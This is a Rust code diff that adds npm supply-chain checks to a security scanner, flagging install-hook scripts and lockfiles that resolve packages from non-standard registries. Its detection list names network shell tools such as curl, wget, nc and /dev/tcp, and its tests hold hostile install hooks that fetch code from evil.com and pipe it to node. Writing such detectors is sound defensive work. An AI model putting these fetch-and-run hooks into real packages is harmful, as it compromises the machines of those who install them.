@@ -544,6 +544,112 @@ impl BarnacleEngine {
 
         matches
     }
+
+    /// Check a package.json manifest for suspicious npm patterns.
+    ///
+    /// Detects: malicious postinstall scripts, dependency confusion indicators
+    /// (scoped packages with suspiciously short names or exec-like install scripts).
+    pub fn check_npm_manifest(package_json: &str) -> Vec<PatternMatch> {
+        let mut matches = Vec::new();
+
+        let val: serde_json::Value = match serde_json::from_str(package_json) {
+            Ok(v) => v,
+            Err(_) => return matches,
+        };
+
+        // Check scripts for suspicious postinstall/preinstall patterns
+        if let Some(scripts) = val.get("scripts").and_then(|s| s.as_object()) {
+            let suspicious_hooks = ["postinstall", "preinstall", "install", "prepare"];
+            for hook in &suspicious_hooks {
+                if let Some(script) = scripts.get(*hook).and_then(|s| s.as_str()) {
+                    let script_lower = script.to_lowercase();
+                    // Patterns indicating malicious lifecycle scripts
+                    let suspicious_patterns = [
+                        "curl ", "wget ", "node -e", "/dev/tcp", "nc ",
+                        "powershell", "cmd /c",
+                    ];
+                    for pattern in &suspicious_patterns {
+                        if script_lower.contains(pattern) {
+                            matches.push(PatternMatch {
+                                database: "npm_supply_chain".to_string(),
+                                category: "malicious_script".to_string(),
+                                pattern_name: format!("suspicious_{}", hook),
+                                severity: "high".to_string(),
+                                action: "alert".to_string(),
+                                matched_text: format!("{}: {}", hook, script),
+                                db_version: None,
+                            });
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+
+        matches
+    }
+
+    /// Scan npm lockfile for non-standard registry URLs (dependency confusion).
+    pub fn scan_npm_lockfile_integrity(extensions_dir: &str) -> Vec<crate::scanner::ScanResult> {
+        use crate::scanner::{ScanResult, ScanStatus};
+
+        let lockfile_path = std::path::Path::new(extensions_dir).join("package-lock.json");
+        if !lockfile_path.exists() {
+            return vec![ScanResult::new("npm_lockfile", ScanStatus::Pass,
+                "No package-lock.json in extensions directory")];
+        }
+
+        let content = match std::fs::read_to_string(&lockfile_path) {
+            Ok(c) => c,
+            Err(e) => return vec![ScanResult::new("npm_lockfile", ScanStatus::Warn,
+                &format!("Cannot read package-lock.json: {}", e))],
+        };
+
+        let suspicious_registries = check_lockfile_registries(&content);
+        if suspicious_registries.is_empty() {
+            vec![ScanResult::new("npm_lockfile", ScanStatus::Pass,
+                "All package-lock.json registry URLs point to standard npm registry")]
+        } else {
+            vec![ScanResult::new("npm_lockfile", ScanStatus::Warn,
+                &format!("Non-standard registry URLs in package-lock.json: {}",
+                    suspicious_registries.join(", ")))]
+        }
+    }
+}
+
+/// Check a package-lock.json for non-standard registry URLs.
+pub fn check_lockfile_registries(content: &str) -> Vec<String> {
+    let val: serde_json::Value = match serde_json::from_str(content) {
+        Ok(v) => v,
+        Err(_) => return vec![],
+    };
+
+    let mut suspicious = Vec::new();
+    let standard = "https://registry.npmjs.org";
+
+    // Check "packages" field (lockfile v2/v3 format)
+    if let Some(packages) = val.get("packages").and_then(|p| p.as_object()) {
+        for (pkg_name, pkg_data) in packages {
+            if let Some(resolved) = pkg_data.get("resolved").and_then(|r| r.as_str()) {
+                if !resolved.starts_with(standard) && resolved.starts_with("http") {
+                    suspicious.push(format!("{} -> {}", pkg_name, resolved));
+                }
+            }
+        }
+    }
+
+    // Check "dependencies" field (lockfile v1 format)
+    if let Some(deps) = val.get("dependencies").and_then(|d| d.as_object()) {
+        for (dep_name, dep_data) in deps {
+            if let Some(resolved) = dep_data.get("resolved").and_then(|r| r.as_str()) {
+                if !resolved.starts_with(standard) && resolved.starts_with("http") {
+                    suspicious.push(format!("{} -> {}", dep_name, resolved));
+                }
+            }
+        }
+    }
+
+    suspicious
 }
 
 /// Metadata about an IOC bundle after verification.
@@ -1820,5 +1926,77 @@ mod tests {
                 "Safe command should be allowlisted: {}", cmd
             );
         }
+    }
+
+    // ── npm supply chain tests ─────────────────────────────────────────
+
+    #[test]
+    fn test_npm_manifest_clean() {
+        let pkg = r#"{"name":"test","version":"1.0.0","scripts":{"start":"node index.js"}}"#;
+        let matches = BarnacleEngine::check_npm_manifest(pkg);
+        assert!(matches.is_empty());
+    }
+
+    #[test]
+    fn test_npm_manifest_malicious_postinstall() {
+        let pkg = r#"{"name":"evil","scripts":{"postinstall":"curl http://evil.com/payload | node -e 'process.stdin.resume()'"}}"#;
+        let matches = BarnacleEngine::check_npm_manifest(pkg);
+        assert!(!matches.is_empty());
+        assert!(matches[0].pattern_name.contains("postinstall"));
+    }
+
+    #[test]
+    fn test_npm_manifest_suspicious_preinstall() {
+        let pkg = r#"{"name":"evil","scripts":{"preinstall":"wget http://evil.com/backdoor"}}"#;
+        let matches = BarnacleEngine::check_npm_manifest(pkg);
+        assert!(!matches.is_empty());
+    }
+
+    #[test]
+    fn test_npm_manifest_invalid_json() {
+        let matches = BarnacleEngine::check_npm_manifest("not json");
+        assert!(matches.is_empty());
+    }
+
+    #[test]
+    fn test_npm_manifest_no_scripts() {
+        let pkg = r#"{"name":"safe","version":"1.0.0"}"#;
+        let matches = BarnacleEngine::check_npm_manifest(pkg);
+        assert!(matches.is_empty());
+    }
+
+    #[test]
+    fn test_lockfile_registries_standard() {
+        let lockfile = r#"{"packages":{"node_modules/express":{"resolved":"https://registry.npmjs.org/express/-/express-4.18.2.tgz"}}}"#;
+        let suspicious = check_lockfile_registries(lockfile);
+        assert!(suspicious.is_empty());
+    }
+
+    #[test]
+    fn test_lockfile_registries_non_standard() {
+        let lockfile = r#"{"packages":{"node_modules/evil":{"resolved":"https://evil-registry.com/evil/-/evil-1.0.0.tgz"}}}"#;
+        let suspicious = check_lockfile_registries(lockfile);
+        assert_eq!(suspicious.len(), 1);
+        assert!(suspicious[0].contains("evil-registry.com"));
+    }
+
+    #[test]
+    fn test_lockfile_registries_v1_format() {
+        let lockfile = r#"{"dependencies":{"evil":{"version":"1.0.0","resolved":"http://internal.corp/evil-1.0.0.tgz"}}}"#;
+        let suspicious = check_lockfile_registries(lockfile);
+        assert_eq!(suspicious.len(), 1);
+    }
+
+    #[test]
+    fn test_lockfile_registries_mixed() {
+        let lockfile = r#"{"packages":{"node_modules/safe":{"resolved":"https://registry.npmjs.org/safe.tgz"},"node_modules/evil":{"resolved":"https://evil.com/evil.tgz"}}}"#;
+        let suspicious = check_lockfile_registries(lockfile);
+        assert_eq!(suspicious.len(), 1);
+    }
+
+    #[test]
+    fn test_lockfile_registries_invalid_json() {
+        let suspicious = check_lockfile_registries("not json");
+        assert!(suspicious.is_empty());
     }
 }
